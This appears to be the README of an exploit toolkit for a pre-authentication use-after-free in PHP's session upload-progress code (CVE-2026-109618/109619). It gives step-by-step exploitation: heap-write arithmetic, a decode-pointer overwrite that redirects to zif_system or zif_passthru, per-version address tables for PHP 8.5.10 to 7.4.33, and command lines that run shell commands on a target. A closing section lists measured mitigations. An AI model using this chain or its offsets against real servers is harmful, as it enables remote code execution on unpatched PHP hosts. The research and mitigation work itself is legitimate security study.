# php2slop

php 8.5 session.upload_progress machinery tooling.
CVE-2026-109618 / CVE-2026-109619: pre-auth cross-request UAF family
(`ext/session/session.c` machinery + ZendMM OOM interruption, window 3129-3338 on 8.5.10).
Fixed 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35 (2026-10-21). Upstream pattern ≥ 5.4.0.
SAPIs: mod_php, no app cooperation needed. FPM, needs an app-reachable fatal after
successful startup, then the upload-progress consumer on the surviving worker (GHSA-6wmf-4rv5-p3rp).

The confirmed FPM route is G2, a typed zval write that overwrites the `php_binary`
session decode pointer in `.data`. It is measured on one plain non PIE 8.5.10 build
with ASLR off. Profiles for 8.4.25, 8.1.34 and 7.4.33 are derived from freshly
built non PIE FPM binaries and are not live runs. Profiles are md5 locked and
selected with `--g2-profile <version|md5>`; the version label is convenience only.
The lab used `php_binary`, whose decode slot is 16 byte aligned. The default `php`
handler decode slot is not 16 byte aligned, so its target is the `PS(serializer)`
pointer slot plus a fake 24 byte `ps_serializer` struct in the record. 5.x cannot
reuse this geometry. It is not a universal exploit: heap addresses X, P, B0 and
the libc base are prerequisites, and an ASLR capable heap leak is still not
demonstrated (F14 attempted-negative).

G6 extends the same FPM write to the serializer decode call itself:
`ps_serializers[2].decode` is pointed at `zif_system` or `zif_passthru`, and
the session record doubles as a fake `zend_execute_data`. On the 8.5.10 lab
(ASLR off) `zif_system` executed the command and then killed the worker with
SIGSEGV at `php_exec+450` because `return_value` is `ZSTR_LEN(data)`;
`zif_passthru` returned HTTP 200 and the worker survived. `zif_passthru` is the
preferred clean target. The 8.4.25, 8.1.34 and 7.4.33 profiles carry
`zif_system`, `zif_passthru`, `php_exec_ex` and `php_exec` (verified with
`nm -an` and `readelf -sW`, with `zif_passthru = zif_system + 0x10`) but are
binary-derived, not live runs.

## Lanes

| lane | SAPI | shape | state |
|---|---|---|---|
| machinery producer and consumer | mod_php 8.5.10 NTS | producer OOM, then a tiny multipart and GET arms | dry wired, live gated; the worker survives |
| app unserialize OOM | mod_php 8.5.10 NTS | `producer_unser` class ladder | dry wired, `--live` gated by `--unser-url` |
| modphp pDestructor superglobal teardown | mod_php 8.5.10 NTS | plant, stale dtor chain, pre-RINIT write into `$_POST` `HashTable.pDestructor` | **closed**: shutdown is fast (`fast_shutdown=1`), no auto table is destroyed |
| FPM app fatal | php-fpm 8.5.10 | post startup fatal inside the unserialize family | kills the worker with exit 70, not a route by itself |
| G2 decode hijack | php-fpm 8.5.10, 8.4.25, 8.1.34, 7.4.33 ET_EXEC | plant, stale dtor chain, pre RINIT decode, `.data` write | 8.5.10 confirmed lab, ASLR off; other offsets derived; offline `--step g2` builder |
| G6 zif serializer decode | php-fpm 8.5.10, 8.4.25, 8.1.34, 7.4.33 ET_EXEC | G2 write points `ps_serializers[2].decode` at `zif_system` / `zif_passthru`; the record is a fake `zend_execute_data` | 8.5.10 lab: `zif_system` command executes, then SIGSEGV at `php_exec+450`; `zif_passthru` HTTP 200 and worker survives; other versions binary-derived; offline `--step g2 --g2-decode zif_passthru / zif_system` |
| in band heap leak | mod_php 8.5.10 PIE | `sidlen` / `sidhex` overread after the M5 write | measured, `leak_offset` 0x2188 build specific; boot2 HTTP candidate (`K_dest` at `sidhex[8:16]`, `B0 = K_dest - 0x1000`) lab-only |
| static session file leak | mod_php 8.5.10 PIE | save_path UAF reclaim, static `sess_*` fetch, M11 encode overread | **attempted-negative (F14)**: save_path control and static serving proven; overread failed; no pointer or `B0`; real target untested |
| real app reachability | MediaWiki/Wikibase, WordPress/WooCommerce | anonymous app request reaches `unserialize` | reachability and availability only, no RCE |

## Chain

```
producer → stale BG(unserialize) → pre RINIT upload progress decode → typed zval write → controlled call
```

1. producer: an unauthenticated request bails out inside `unserialize()`, skipping `PHP_VAR_UNSERIALIZE_DESTROY`
2. consumer: the next multipart request decodes its session inside `sapi_activate()`, before RINIT resets the globals
3. negative `used_slots` passes `used_slots + num > VAR_DTOR_ENTRIES_MAX`; the decoder writes a parsed zval at `B0 + 0x10 + 16 * used_slots`
4. G2 overwrites `ps_serializers[2].decode` with a controlled 64 bit value; the forced END decode calls it with the session record as `rdi`

G2 arithmetic, measured on the lab build:

```
used_slots = (target - (B0 + 0x10)) / 16
slot       = B0 + 0x10 + 16 * used_slots
second     = target + 16
```

The target must be 16 byte aligned, `used_slots` is negative, and session
normalize zeroes the type words at `target + 8` and `target + 24` (the
`ps_serializers[3]` name and decode slots). The fake `php_unserialize_data` at P
and the fake `var_dtor_entries` at B0 must both fall inside the session record
buffer. The receipt geometry is `X=0x7ffff7a6a000`, `P=0x7ffff7a81000`,
`B0=0x7ffff7a84000`, total 131014, `used_slots -8796082913867`, target
`0x14c1b60` (`php_binary` decode).

G2 is confirmed in two plant runs (n=7, n=11), same worker, marker created, one
shot per plant. A corrupt decode pointer persists until the worker restarts.

### G6 zif serializer decode (lab RCE)

G6 keeps the G2 write but writes `zif_system` or `zif_passthru` into
`ps_serializers[2].decode` instead of `system`. The 8.5.10 record is 131,014
bytes (`T1`). Decode #1 performs the G2 write; the request re-encodes the same
record to 131,313 bytes (`T2`); decode #2 calls the overwritten pointer with
`rdi = ZSTR_VAL(data) = 0x7ffff7aae018` and `rsi = ZSTR_LEN(data) = 0x200f1`
(131,313). With `zif_system` (`0x88f6a7`) the lab gdb trace recorded
`ser2decode=0x88f6a7`, `php_exec_ex` with `rdx=0x1 numargs=1 arg1val=... arg1type=6`,
`php_exec type=1`, and the command created `FPM_ZIF`. The worker then took
SIGSEGV at `php_exec+450` (`mov %rax,(%rcx)`, `rcx=0x200f1`).

The parse is minimal: `S+0x2c` `num_args=1`; `S+0x50` is the argument zval
value `F`; `S+0x58` is `IS_STRING` (`6`); `F+0x10` is `strlen(F+0x18)`; and
`F+0x18` is the non-empty, NUL-free command. `func` and `arg_info` at
`S+0x18`/`S+0x20` are not read. `F = X2 + 0x18 + Q + 0x100`; in the lab
`Q=0x77`, so `F=0x7ffff7aae18f` and the command starts at `Q+0x118`. The
96-byte binary key supplies the fake call fields and is written back verbatim
by the re-encoder.

The identical chain with `zif_passthru` (`0x88f6b7`) is the clean control:
`php_exec type=3` never writes `return_value`, the request returned HTTP 200
(`PID=1249787`), the marker was recreated, and the worker survived. That
isolates the `zif_system` crash to the return-value write. `zif_system` is
therefore a one-shot proof; `zif_passthru` is preferred when the worker must
survive. Both modes need X1 (first decode buffer) for P/B0 and X2 (second,
re-encoded buffer) for F, and neither supplies an ASLR-capable heap leak.

| build | target slot | `zif_system` | `zif_passthru` | `php_exec_ex` | `php_exec` | state |
|---|---|---|---|---|---|---|
| 8.5.10 | `0x14c1b60` | `0x88f6a7` | `0x88f6b7` | `0x88f435` | `0x88f21f` | live G6 proof, ASLR off |
| 8.4.25 | `0xe01180` | `0x753d20` | `0x753d30` | `0x753aa3` | `0x75388d` | binary-derived |
| 8.1.34 | `0xe01140` | `0x7348f9` | `0x734909` | `0x73467d` | `0x734467` | binary-derived |
| 7.4.33 | `0xe010a0` | `0x71dd66` | `0x71dd76` | `0x71daf7` | `0x71d7fc` | binary-derived |

Real-target status is unchanged: F12b is pending, F14 is attempted-negative,
and the boot2 HTTP leak candidate is lab-only. G6 is a private ASLR-off lab
proof, not a real-target claim. Receipt:
`/tmp/opencode/research/g6zif_20261021T222434Z/README.md`.

G3 is closed: `zend_array.pDestructor` is an arbitrary call primitive with `rdi`
pointing at a controlled zval, but neither binary has a usable stack pivot, `rsi`
is uncontrolled at the call, and `system` is not imported.

The mod_php pDestructor **superglobal teardown** lane is also closed, for a
different reason. The pre-RINIT write into `$_POST` `HashTable.pDestructor`
(`heap+0x2060`) succeeds and survives to `php_request_shutdown`, but
`zend_shutdown_executor_values` takes the fast path (`is_zend_mm()` true and
`EG(full_tables_cleanup)` 0) and skips
`zend_hash_graceful_reverse_destroy(&EG(symbol_table))`. `$_POST` therefore
stays at rc 1: no `zend_array_destroy` and no `zend_hash_destroy` runs on it.
No auto global table with elements is destroyed at shutdown; the first such
table is internal at `heap+0x1fc0` with a NULL `pDestructor`. The session and
uploaded_files destructors are `8 mod 16` with uncontrolled values, so the
aligned 16-byte write grid cannot reach them. `zend_get_properties_for`,
`php_exec_ex` and `zif_system` were never entered and no PWNED file was
created. Reopening this lane needs an allocator configuration change, a
primitive that forces slow shutdown, an 8-byte table shift, or an object
handler destructor. The FPM serializer lane (G2) remains the viable decode path.
Evidence: `/tmp/opencode/research/gadget_20261021T210031Z/README.md` section 8
and `lab/gdb/gdb_u3.log`.

F14 is attempted-negative, not open: no ASLR capable heap leak is demonstrated
end-to-end. The static session file route was run to a negative result on local
Apache 2.4.66 + mod_php 8.5.10, loopback only. The M6 save path control and
static serving are proven: the failed
`ini_set`/deactivate restore leaves `PS(save_path)` dangling to the request
`zend_string`, the 54 byte GET value reclaims the same allocator bin, and
`ps_files_open` used the attacker directory. After a restart, `GET /u/sess_tb1`
returned the seeded 77,842 bytes with a matching sha1. The M11 encode overread
failed: the 64,946 byte plant record rounds to `0x10000` and the 77,842 byte
trigger record rounds to `0x14000`, so the trigger allocation moved `+0x2000`;
the stale `P` landed in filler, `TMPVAR last_dtor=0x4141414141414141`, and the
worker took SIGSEGV in `tmp_var` at `var_unserializer.c:168`. There was no
`PS_WRITE`, no access log line and no overread; the static GET was byte identical
to the seed. No heap pointer and no `B0` were recovered; the gdb measured `P` and
`B0` are not leaks. The full chain is not demonstrated.

Controls are partial: 21 exchanges against a bound of 20 and 3 of 3 restarts.
The formal no-save-path, file-not-present and different-sid controls were not
executed; the benign record control plus the no-reclaim E1/E2 opens are not
substitutes. The receipt's real-target list is a requirement set, not a target
test: a directory writable by the PHP user and URL mapped and statically served
by the same server; an attacker-controlled `sess_<sid>` name and bytes; readable
mode/owner; a reclaiming `save_path` string in the same allocator bin class; a
per-request save_path restore; OOM reachable under `memory_limit` with upload
progress; an app `session_start` with an attacker-controlled sid; and a separate
heap address source for `P` and `B0`.

`fpmboot` derives `B0 = K_dest1 - 0x9000` only for a fixed body layout with ASLR
off, so the G2 plan still takes X, P and B0 from the operator. The live gdb-free
candidate is the mod_php boot2 HTTP leak: the 8 byte word at `sidhex[8:16]` is
`K_dest`, and `B0 = K_dest - 0x1000`. It is lab-only so far; the boot2 receipt's
single-process run that takes `B0` only from HTTP and then sends stage 2 was not
executed. Receipts:
`/tmp/opencode/research/staticleak_20261021T214538Z/README.md` (with
`SHA256SUMS` in the same directory) and
`/tmp/opencode/research/boot2_20261021T214428Z/README.md`.

## Layout

| path | contents |
|---|---|
| `tool/php2shell.py` | driver CLI (`--step recon\|producer\|write_stage\|leak\|g2\|chain`) |
| `tool/run`, `tool/__main__.py` | `./tool/run`, `python -m tool` |
| `tool/modules/arm.py` | multipart `PHP_SESSION_UPLOAD_PROGRESS` builders, HTTP framing, 14-byte disclosure analyzer |
| `tool/modules/native-output-leak-stock-arm.py` | STOCK arm body (author-provided reconstruction) |
| `tool/modules/compact-stock-tail.py` | COMPACT rearm + final forged multipart (author-provided reconstruction) |
| `tool/modules/producer_618.py` / `producer_619.py` | CVE-109618 / CVE-109619 staged producer shapes (inert forge default) |
| `tool/modules/producer.py` | 618/619 shape facade (not driver-wired); mod_php producer TODO |
| `tool/modules/producer_fpmwiki.py` | fpmwiki producer stage (`--step producer`): anon-edit OOM, int N (5.7M receipt); offline byte-build default, `--live` gates the send |
| `tool/modules/producer_modphp.py` | modphp producer stage (`--step producer`); STOCK-arm byte parity, int N ladder, knob gate, dry default |
| `tool/modules/producer_unser.py` | offline unserialize OOM class ladder (2M / 8M / 128M), dry default with zero sockets |
| `tool/modules/write_stage.py` | write stage, wired, dry-only (`--step write_stage`) |
| `tool/modules/leak_stage.py` | mod_php leak stage, dry-only (`--step leak`): Set-Cookie PS(id) request shapes and section C calibration; `leak_offset` is surfaced with its build binding |
| `tool/modules/g2_chain.py` | G2/G6 FPM per build profiles selected by version or md5, and the offline `--step g2` record plan: php_binary or zif_system/zif_passthru decode, negative `used_slots`, fake struct and fake execute_data placement, record bytes, self-checks |
| `tool/modules/profiles.py` | `BINARY_PROFILES` + `TARGETS` registry |
| `tool/stages/probe.py` | pre-flight fingerprint (GET, status/headers) |
| `addresses/` | per-binary offsets (`g2_fpm_8510.json`, `g2_fpm_8425.json`, `g2_fpm_8134.json`, `g2_fpm_7433.json`, `apache_libphp.json`, FPM/CGI flavors, `generated/`) |
| `universal/` | `profile_builder.py` (read-only `nm`/`readelf`), freeze battery, wiki/wp run captures |
| `fuzzing/` | CGI fuzz harness, deterministic ASAN heap-UAF crashes, `fuzz_findings.md` |
| `receipts/` | curated named runs: `diag3_10_runs/`, `php5lab/`, `php7lab/`, `advisory_1400/` (index + rule: `receipts/README.md`) |
| `receipts/mitigation_matrix_1021/` | M1 to M4, nginx edge N0 to N4, M5 no-upload U0 to U6, PHP 8.5.12 patch runs: per-lane `findings.md`, `results/`, `logs/`, `inventory.sha256.txt` |
| `docs/` | `validation_1021_filmpost.md`, `reports_realapps_validation_1021.md`, `runtime_addresses.md` |
| `docs/mitigation_matrix_1021.md` | measured control matrix M1 to M5f / E1 to E3 / P with per-control decision and evidence links |
| `USAGE.md` | lane matrix, G2 plan, version matrix, prerequisites, failure diagnosis |
| `LICENSE` | AGPL-3.0 |

## Version matrix

| branch | audited vulnerable | first fixed | note |
|---|---|---|---|
| 8.5 | 8.5.10 (live), 8.5.11 (source) | 8.5.12 | `php_basic_early_rinit` resets `BG(unserialize)` before `sapi_activate` |
| 8.4 | 8.4.25 (source) | 8.4.27 | same early reset; 8.4.26 is structurally identical to 8.4.25 |
| 8.3 | 8.3.27 (source) | 8.3.36 | same early reset |
| 8.2 | 8.2.29 (source) | 8.2.35 | same early reset |
| 8.1, 8.0, 7.x, 5.x | EOL, unpatched | none | 7.4.33 write reproduced 4/4; built FPM G2 offsets derived for 8.1.34 and 7.4.33; 5.x geometry differs |

Measured span: 7.4.33 to 8.5.11. G2 is live confirmed only on 8.5.10. The
8.4.25, 8.1.34 and 7.4.33 G2 offsets are from freshly built non PIE FPM binaries,
not live runs. G6 is live confirmed only on 8.5.10; the other three profiles
carry `zif_system`, `zif_passthru`, `php_exec_ex` and `php_exec` verified with
`nm -an` and `readelf -sW` (`zif_passthru = zif_system + 0x10`), but are
binary-derived. Profiles are md5 locked: `--g2-profile` accepts the binary md5, and
a version label is only a convenience. Do not key offsets on the version alone:
`ps_serializers` is build specific. The default `php` handler decode slot is not
16 byte aligned, so use the `PS(serializer)` slot and a fake 24 byte
`ps_serializer` struct. 5.x cannot reuse this geometry: `php_unserialize_data`
has a different field order, `used_slots` is at `+0x2000`, `next` at `+0x2008`,
the bound is equality, and `BG(unserialize)` is a struct.

## Requirements

python3 ≥ 3.10, stdlib only. Loopback target you own. `gdb`/`nm`/`readelf` optional
(`universal/profile_builder.py`, gdb runs in `receipts/diag3_10_runs/`).

## Run

```sh
./tool/php2shell.py --target wiki --step recon      # fingerprint + stock arm + leak probe + addresses
python3 -m tool --target wiki --step recon          # same via package entry
./tool/php2shell.py --target wp --step chain        # blocker hold + rearm + forged staged multipart
./tool/php2shell.py --target wiki --step chain --command id
./tool/php2shell.py --target wiki --step producer --body-bytes 5700000   # byte-build only, no send
./tool/php2shell.py --target modphp --step producer --body-bytes 262144  # byte-build only, no send
./tool/php2shell.py --target modphp --step producer --producer unser --memory-limit 2M  # unser payload, byte-build only, no send
./tool/php2shell.py --target wiki --step write_stage --main-chunk 0x7f8875a00000   # byte-build only, no send
./tool/php2shell.py --url http://127.0.0.1:28840/index.php --profile realapps-pie --step recon
./tool/php2shell.py --step g2 --g2-x 0x7ffff7a6a000 --g2-p 0x7ffff7a81000 \
  --g2-b0 0x7ffff7a84000 --g2-total 131014 \
  --command 'touch /tmp/fpmgadget_sys;exit;#' --libc-base 0x7ffff7c9c000  # record only, no transport
./tool/php2shell.py --step g2 --g2-decode zif_passthru \
  --g2-x 0x7ffff7a6a000 --g2-x2 0x7ffff7aae000 \
  --g2-p 0x7ffff7a81000 --g2-b0 0x7ffff7a84000 \
  --command 'touch /tmp/FPM_ZIF'  # G6 clean control, record only, no transport
```

`--step g2` writes `g2-record.bin` and `result.json`. It never opens a socket,
refuses `--live`, and does not guess X, X2, P or B0. The first example reproduces
the receipt record byte for byte
(sha256 `373b4bb1dabda7e4417942ef0b1cd75bbe3880f83b4d1b10187cf66708e075e8`).
Add `--g2-profile 8.4.25|8.1.34|7.4.33|<md5>` to select another md5 locked
profile; it selects offsets only, and X, X2, P, B0, the libc base and the record
length are still operator supplied. The receipt geometry above is 8.5.10
specific.

For G6, `--g2-decode zif_passthru` (preferred, clean) or `--g2-decode
zif_system` (one-shot) keeps `--g2-target` as the write slot and writes the
profile zif address as `i:<address>;`. `--g2-x2` is the second, re-encoded
decode buffer and is required. The command is NUL-free and is not padded to 32
bytes; `--g2-value` and `--libc-base` are rejected. With the lab geometry and
command `touch /tmp/opencode/research/g6zif_20261021T222434Z/FPM_ZIF`, the
records are `zif_system` sha256
`3ba454f85777e57230330fd483401dbfd384570b635d0818b0a93e4454f7354f` and
`zif_passthru` sha256
`a3622221a56ef25cb1e652a590b0fd22f52a2c919bd9aeff28957b448b81a84f`.

Not implemented or closed:

| item | state |
|---|---|
| ASLR capable FPM heap leak | attempted-negative (F14); static session file route: save_path control and static serving proven, overread failed, no pointer or `B0`; `boot2` HTTP candidate is lab-only; `fpmboot` needs a fixed body layout and ASLR off |
| G6 real-target evaluation | **F12b pending**; G6 is live only on the private ASLR-off 8.5.10 lab (`zif_system` one-shot, `zif_passthru` clean control); no real target tested |
| G2/G6 on 5.x | not derived; 5.x layout differs (`used_slots +0x2000`, `next +0x2008`, equality bound, struct `BG(unserialize)`) |
| G3 `pDestructor` pivot | closed; no pivot, uncontrolled `rsi`, no libc `system` import |
| modphp pDestructor superglobal teardown | closed; the POST write lands, but fast shutdown skips `zend_hash_graceful_reverse_destroy(EG(symbol_table))`, so no auto global table is destroyed and the gadget is not invoked |
| modphp measured chain constants | `TARGETS["modphp"]` producer and leak wired; superglobal teardown lane closed, FPM serializer lane (G2/G6) is the viable decode path, still operator-addressed |

Parameterized producer/step plan: `/tmp/opencode/realapps/side/php2shell/runs/UNIVERSAL_PLAN.md`.

## Targets

| attribute | wiki | wp | modphp |
|---|---|---|---|
| binary profile | `realapps-pie` | `realapps-pie` | `addresses/apache_libphp.json` |
| endpoint | 127.0.0.1:28840 `/index.php` | 127.0.0.1:28841 `/index.php` | 127.0.0.1:28850 `/mem.php` |
| `memory_limit` | 8M (`php_admin_value`) | 8M | 2M (`php_value` knob) |
| pm / max_children | static / 1 | static / 1 | n/a |
| `session.save_path` | `/tmp/opencode/realapps/sessions/wiki` | `/tmp/opencode/realapps/sessions/wp` | n/a |
| `session.upload_progress.enabled` | 1 (compiled default) | 1 | n/a |
| `session.upload_progress.cleanup` | 1 at runtime (diag labs override 0) | 1 | n/a |
| producers | `producer_fpmwiki`, `producer_618`, `producer_619` | `producer_618`, `producer_619` | `producer_modphp`, `producer_unser` |
| status | run (producer wired) | run | producer wired, leak dry; pDestructor superglobal lane closed, FPM serializer lane (G2/G6) open |

Values as-found on the lab stack (verify per run). Add a target: new dict in
`tool/modules/profiles.py:TARGETS` + constants in `BINARY_PROFILES` (generate via
`universal/profile_builder.py`, offsets per `addresses/*.json`).

Real app runs, no modifications to either app tree:

| app | request | result |
|---|---|---|
| MediaWiki 1.46.2 + Wikibase REL1_46 | anonymous `action=parse`, `contentmodel=wikibase-item`, `contentformat=application/vnd.php.serialized` | a 52,065 B blob exhausts 1 GiB inside `php_var_unserialize_internal` at depth 1,533, HTTP 500; the FPM child survives and serves the next request on the same PID; F3/F5 stale state confirmed at decode level |
| WordPress 7.1.3 + WooCommerce 11.2.1 | guest classic checkout, 12 address fields, 84 MiB synthetic pressure, WCS sink replica | producer OOM inside `unserialize`; the next multipart consumer writes into the stale dtor block; 1 of 4 consumers died with SIGSEGV (502), 3 of 4 returned 200; the sink is a labeled replica because paid WCS 9.0.0 was not on disk; no RCE claimed |

Ini knobs that matter: `memory_limit` (produces the OOM fatal), `post_max_size`
(>8M aborts pre-machinery on this stack), `max_file_uploads` (arm file-part cap),
`pm=static` (pinned child mapping), `session.save_path` (attacker-writable `sess_*`
records), `session.upload_progress.*` (gates the consumer; `cleanup` timing).

## Receipts

`--step` writes `files/io/<target>-<step>-<UTC stamp>/` (or `--output DIR`):
`<label>-request/-response/-body.bin` + `result.json` (status, headers, sha256 per artifact).

| step | extra |
|---|---|
| recon | derived addresses (`main`, `target`, `stage`, `dso_candidates`) |
| leak | dry calibration plan, `leak_offset` and its build binding |
| g2 | `g2-record.bin`, profile, md5, addresses, geometry, checks, record sha256 |
| chain | blockers count, per-candidate result, `uid=` line on success |

Runtime output dir is git-ignored. Curated evidence: `receipts/<name>/` with a README
(`receipts/README.md`). Raw one-off logs/binaries stay git-ignored; curated `receipts/**`
is force-included (`.gitignore: !receipts/**`), as are the frozen `universal/` captures
and `fuzzing/crashes/` artifacts.

## References

- CVE-2026-109618: https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w
- CVE-2026-109619: https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp
- Fix release 2026-10-21: https://www.php.net/archive/2026.php#2026-10-21-5
- Writeup (upstream, alias `php2shell`): https://calif.io/php2shell/ and http://php2shell.com
- Internal: `docs/` (validation log, master report), `receipts/` (named runs)

Loopback-only, operator-owned targets. Use against third-party systems is out of scope and
out of license. AGPL-3.0; no warranty.

## Mitigations (measured 2026-10-21)

The PHP 8.5.12 patch is the only complete fix; every control below reduces
attack surface or availability impact and must be kept after patching.

Full matrix: [`docs/mitigation_matrix_1021.md`](docs/mitigation_matrix_1021.md),
receipts: [`receipts/mitigation_matrix_1021/`](receipts/mitigation_matrix_1021/).

Measured compensating controls:

- **M1** `session.upload_progress.enabled=0` (admin scope), consumer-only:
  removes the 109619 progress-record writer/update path, not the 109618 OOM
  (lane C: 3/3 arms killed the worker at 8M).
- **M2** size `memory_limit` to the actual body ceiling: php-cgi
  `≥ 3 × post_max_size + 4 MiB`; FPM/nginx
  `≥ 6.5 × client_max_body_size + 1 MiB` (8× recommended).
- **E1** edge cap plus headroom: `client_max_body_size 2m` + PHP
  `memory_limit 128M` answers 413 before PHP; cap alone (2m at 8M) is unsafe (3/3 fatal).
- **M5, no-upload apps only** method-scoped nginx 415 on `POST`/`PUT`/`PATCH`
  `multipart/form-data` + `client_max_body_size 128k` + `file_uploads=Off`
  (arm 415 before PHP; urlencoded POST and GET stay 200).
- **Rejected:** token/body WAF rule on `PHP_SESSION_UPLOAD_PROGRESS`; the
  literal token is blocked, but the OOM fires with no token at all.

Before deploying 8.5.12, stage the patch-release regressions
GH-24488, GH-24492, GH-24493, GH-24489.
